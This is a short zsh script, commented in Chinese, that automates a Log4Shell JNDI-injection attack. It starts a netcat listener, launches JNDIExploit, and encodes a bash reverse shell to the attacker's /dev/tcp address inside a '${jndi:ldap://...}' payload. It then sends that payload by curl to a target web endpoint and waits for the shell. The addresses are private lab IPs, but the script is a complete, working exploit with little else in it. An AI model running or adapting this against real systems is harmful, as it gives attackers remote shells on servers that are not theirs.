#!/bin/zsh

# 配置变量
ATTACKER_IP="192.168.182.130"
ATTACKER_PORT="7777"
TARGET_IP="192.168.182.129"
JNDI_EXPLOIT_PATH="/path/to/JNDIExploit-1.2-SNAPSHOT.jar"

# 提示用户输入目标端口
read "TARGET_PORT?Enter the target port: "

# 检查目标端口是否为空
if [[ -z "$TARGET_PORT" ]]; then
    echo "Error: Target port cannot be empty"
    exit 1
fi

echo "Using target port: $TARGET_PORT"

# 创建新的 tmux 会话，用于 nc 监听
tmux new-session -d -s nc_listener "nc -l -p $ATTACKER_PORT"

# 创建新的 tmux 会话，用于启动 JNDIExploit
tmux new-session -d -s jndi_exploit "java -jar $JNDI_EXPLOIT_PATH -i $TARGET_IP"

# 构建 payload
SHELL_COMMAND="bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
BASE64_PAYLOAD=$(echo -n "$SHELL_COMMAND" | base64 -w 0 | sed 's/+/%2B/g' | sed 's/=/%3d/g')
TARGET_URL="http://$TARGET_IP:$TARGET_PORT/hello"
FULL_PAYLOAD="\${jndi:ldap://$ATTACKER_IP:1389/TomcatBypass/Command/Base64/${BASE64_PAYLOAD}}"
URL_FULL_PAYLOAD=$(echo ${FULL_PAYLOAD} | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')

# 构建 curl 命令
CURL_COMMAND="curl \"${TARGET_URL}?payload=${URL_FULL_PAYLOAD}\""

# 输出并发送 payload
echo "Sending payload with the following curl command:"
echo $CURL_COMMAND
eval $CURL_COMMAND

echo "Attack deployed. Waiting for reverse shell connection..."
